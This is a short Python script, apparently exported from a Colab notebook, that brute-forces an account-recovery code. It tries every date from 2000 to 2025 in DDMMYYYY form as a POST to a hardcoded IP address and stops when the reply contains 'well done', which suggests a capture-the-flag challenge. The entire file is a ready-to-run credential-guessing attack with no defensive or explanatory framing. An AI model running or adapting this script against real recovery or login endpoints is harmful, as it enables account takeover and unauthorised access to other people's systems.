# -*- coding: utf-8 -*-
"""Brute Force.ipynb

Automatically generated by Colab.

Original file is located at
    https://colab.research.google.com/drive/103g7wcskXFN18Sp3VRuG5AYAaVhG7jX1
"""

import requests
from datetime import datetime, timedelta

# Target URL or endpoint for the recovery service
url = "http://3.8.206.218:4224/recovery"

# Function to generate all valid dates in the given range
def generate_dates(start_year=2000, end_year=2025):
    start_date = datetime(start_year, 1, 1)  # January 1, 2000
    end_date = datetime(end_year, 12, 31)  # December 31, 2025
    delta = timedelta(days=1)  # Increment by one day

    while start_date <= end_date:
        yield start_date.strftime("%d%m%Y")  # Format date as DDMMYYYY
        start_date += delta

# Function to brute-force the recovery code
def brute_force_recovery_code():
    for date_code in generate_dates():
        print(f"Trying recovery code: {date_code}")

        # HTTP POST request payload
        data = {
            "recovery_code": date_code
        }

        try:
            # Send the request
            response = requests.post(url, data=data)

            # Check for "well done" in the response text
            if "well done" in response.text.lower():
                print(f"\nCorrect recovery code found: {date_code} (Response: {response.text.strip()})")
                return date_code  # Exit the function and return the code

        except requests.exceptions.RequestException as e:
            # Log the exception message for debugging
            print(f"Error during request: {e}")

            # Check if "well done" is in the exception message
            if "well done" in str(e).lower():
                print(f"\nCorrect recovery code found: {date_code} (Error Log: {e})")
                return date_code  # Exit the function and return the code

    return None  # Return None if no code is found

# Run the brute-force function
correct_code = brute_force_recovery_code()

# Display the final result
if correct_code:
    print(f"\nThe correct recovery code is: {correct_code}")
else:
    print("\nNo valid recovery code was found within the date range.")

